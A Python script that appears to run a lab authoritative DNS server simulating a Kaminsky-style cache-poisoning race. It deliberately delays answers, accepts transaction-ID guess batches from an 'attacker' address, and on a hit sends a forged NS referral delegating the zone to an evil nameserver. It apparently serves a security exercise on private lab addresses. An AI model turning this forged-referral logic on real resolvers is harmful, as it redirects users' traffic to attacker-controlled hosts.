#!/usr/bin/env python3
import socket, threading, time, json, ipaddress
import dns.message, dns.rrset, dns.rdatatype, dns.rcode, dns.flags

BIND_IP='172.16.6.20'; DNS_PORT=53; RELAY_PORT=5300
RESOLVER='10.9.0.10'; RESOLVER_PORT=33333; ATTACKER='10.10.0.200'
ZONE='example.lab10.test.'; WWW='www.example.lab10.test.'; LEGIT_WEB='172.16.6.10'
EVIL_NS='ns.evil.example.lab10.test.'; EVIL_IP='10.10.0.200'
PENDING={}; LOCK=threading.Lock(); RACE_DELAY=3.0

def legit_response(query):
    qname=str(query.question[0].name).lower(); r=dns.message.make_response(query); r.flags |= dns.flags.AA
    if qname==WWW:
        r.answer.append(dns.rrset.from_text(WWW,60,'IN','A',LEGIT_WEB)); return r
    r.set_rcode(dns.rcode.NXDOMAIN); return r

def forged_referral(query):
    r=dns.message.make_response(query); r.flags |= dns.flags.AA; r.set_rcode(dns.rcode.NOERROR)
    r.answer.clear(); r.authority.clear(); r.additional.clear()
    r.authority.append(dns.rrset.from_text(ZONE,600,'IN','NS',EVIL_NS))
    r.additional.append(dns.rrset.from_text(EVIL_NS,600,'IN','A',EVIL_IP))
    return r

def delayed_legit(sock,q,addr,qname,txid):
    time.sleep(RACE_DELAY)
    with LOCK:
        rec=PENDING.get(qname)
        if rec and rec['txid']==txid and not rec.get('done'):
            sock.sendto(legit_response(q).to_wire(),addr); rec['done']=True
            print(f'[LEGIT] q={qname} txid={txid} -> {addr[0]}:{addr[1]}')

def dns_loop(sock):
    while True:
        data,addr=sock.recvfrom(4096)
        if addr[0]!=RESOLVER or addr[1]!=RESOLVER_PORT: continue
        try: q=dns.message.from_wire(data)
        except Exception: continue
        if len(q.question)!=1: continue
        qname=str(q.question[0].name).lower(); txid=q.id
        if not qname.endswith(ZONE): continue
        if qname==WWW:
            time.sleep(0.15); sock.sendto(legit_response(q).to_wire(),addr); print(f'[WWW] legitimate {WWW} -> {LEGIT_WEB}'); continue
        with LOCK: PENDING[qname]={'txid':txid,'query':q,'addr':addr,'done':False,'ts':time.time()}
        print(f'[PENDING] {qname} txid={txid} resolver={addr[0]}:{addr[1]} delay={RACE_DELAY}s')
        threading.Thread(target=delayed_legit,args=(sock,q,addr,qname,txid),daemon=True).start()

def relay_loop(sock53):
    s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.bind((BIND_IP,RELAY_PORT))
    print(f'[RELAY] {BIND_IP}:{RELAY_PORT} accepts batch guesses only from {ATTACKER}')
    while True:
        data,addr=s.recvfrom(2048)
        if addr[0]!=ATTACKER: continue
        try: m=json.loads(data.decode()); qname=m['qname'].lower(); start=int(m['start']); count=int(m['count'])
        except Exception: continue
        if count<1 or count>8192 or start<0 or start>65535: continue
        with LOCK:
            rec=PENDING.get(qname)
            if not rec or rec.get('done'): continue
            txid=rec['txid']
            hit = start <= txid < min(start+count,65536)
            if hit:
                r=forged_referral(rec['query']); sock53.sendto(r.to_wire(),rec['addr']); rec['done']=True
                print(f'[HIT] batch {start}-{min(start+count-1,65535)} contains txid={txid}; forged delegation -> {EVIL_NS} {EVIL_IP}')

def main():
    if ipaddress.ip_address(BIND_IP)!=ipaddress.ip_address('172.16.6.20'): raise SystemExit('scope')
    sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); sock.bind((BIND_IP,DNS_PORT))
    print(f'LAB10 AUTH-DNS on {BIND_IP}:53; {WWW}->{LEGIT_WEB}; random labels NXDOMAIN after {RACE_DELAY}s')
    threading.Thread(target=relay_loop,args=(sock,),daemon=True).start(); dns_loop(sock)
if __name__=='__main__': main()
